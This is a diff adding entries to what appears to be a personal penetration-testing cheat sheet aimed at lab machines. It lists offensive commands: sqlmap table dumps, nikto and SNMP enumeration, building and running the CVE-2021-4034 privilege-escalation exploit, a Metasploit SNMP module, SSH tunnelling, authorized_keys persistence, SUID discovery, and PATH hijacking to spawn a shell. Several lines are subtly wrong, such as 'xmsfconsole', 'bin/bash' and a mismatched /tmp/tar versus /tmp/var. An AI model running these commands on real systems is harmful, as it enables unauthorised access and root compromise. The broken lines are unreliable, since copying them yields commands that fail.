@@ -399,3 +399,59 @@
   0 or 1(choose injection point)
   sqlmap -r /Downloads/example.txt -D owasp10 --tables(access table)
   sqlmap -r /Downloads/example.txt -D owasp10 -T accounts --dump(access table's elements)
+
++ nikto
+  nikto -h 192.168.30.128
+
++ snmpenum
+  sudo apt install snmpenum
+  snmpenum 10.10.11.136 public linux.txt
+
++ snmpwalk
+  sudo apt install snmp
+  snmpwalk -c public -v2c -On 10.10.11.136
+
++ CVE-2021-4034
+  $ sudo apt install git (On Ubuntu)
+  $ cd CVE-2021-4034/
+  $ make
+  $ ./cve-2021-4034
+
++ untar
+  tar -xvf kkk.tar.gz
+
++ snmp exploit through metasploit
+  xmsfconsole -q
+  search snmp
+  use 25
+  options
+  set RHOSTS 10.10.11.136
+  run
+
++ export result in log file
+  ./linpeas.sh | tee a.log
+
++ ssh tunnling
+  ssh daniel@10.10.11.136 -L 80:localhost:80
+  ssh -D 1234 daniel@10.10.11.136
+
++ .ssh setup
+  mkdir .ssh
+  chmod 700 .ssh
+  cd .ssh
+  touch authorized_keys
+  chmod 600 authorized_keys
+  export TERM=xterm
+
++ ssh key generation
+  ssh-keygen -t rsa
+
++ find ask permission for execution files
+  find -perm -4000 2>/dev/null
+
++ export path
+  export PATH=/tmp:$PATH
+
++ put bash into tar and execute it
+  echo "bin/bash" > /tmp/tar
+  chmod +x /tmp/var
